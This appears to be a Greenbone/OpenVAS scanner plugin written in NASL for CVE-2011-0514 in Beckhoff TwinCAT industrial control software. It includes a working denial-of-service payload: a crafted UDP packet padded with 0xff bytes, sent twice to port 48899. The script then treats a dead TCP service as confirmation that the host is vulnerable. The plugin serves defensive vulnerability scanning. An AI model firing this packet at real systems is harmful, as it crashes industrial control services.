# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802036");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)");
  script_cve_id("CVE-2011-0514");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Beckhoff TwinCAT 'TCATSysSrv.exe' Network Packet Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(48898);
  script_require_udp_ports(48899);

  script_xref(name:"URL", value:"http://secunia.com/advisories/45981");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49599");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17835");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/105088");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/twincat_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-06.pdf");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
  service condition.");

  script_tag(name:"affected", value:"Beckhoff TwinCAT Version 2.11 build 1553, Other versions may
  also be affected.");

  script_tag(name:"insight", value:"The flaw is caused by an error in the 'TCATSysSrv.exe' when
  performing an invalid read access, which can be exploited by remote attacker
  by sending malformed packet to port 48899/UDP.");

  script_tag(name:"solution", value:"Vendor has released a patch to fix the issue, please contact
  the vendor at 'patch@beckhoff.com' for patch information.");

  script_tag(name:"summary", value:"Beckhoff TwinCAT is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.beckhoff.de/twincat/");
  exit(0);
}

tcp_port = 48898;
if(!get_port_state(tcp_port)){
  exit(0);
}

udp_port = 48899;
if(!get_udp_port_state(udp_port)){
  exit(0);
}

# nb: Confirm Beckhoff TwinCAT other port is running
# This port also stops listening, if exploit works successfully
soc = open_sock_tcp(tcp_port);
if(!soc){
  exit(0);
}
close(soc);

soc1 = open_sock_udp(udp_port);
if(!soc1){
  exit(0);
}

req = raw_string( 0x03, 0x66, 0x14, 0x71, 0x00, 0x00, 0x00, 0x00,
                  0x06, 0x00, 0x00, 0x00, 0x0a, 0xff, 0xff, 0x02,
                  0x01, 0x01, 0x10, 0x27,
                  crap(data:raw_string(0xff), length:1514) );

send(socket:soc1, data:req);
send(socket:soc1, data:req);

sleep(7);

## TCP port 48898 as it's hard to detect UDP port status and
## available function will not work properly
soc2 = open_sock_tcp(tcp_port);
if(!soc2)
{
  security_message(udp_port);
  exit(0);
}
close(soc2);
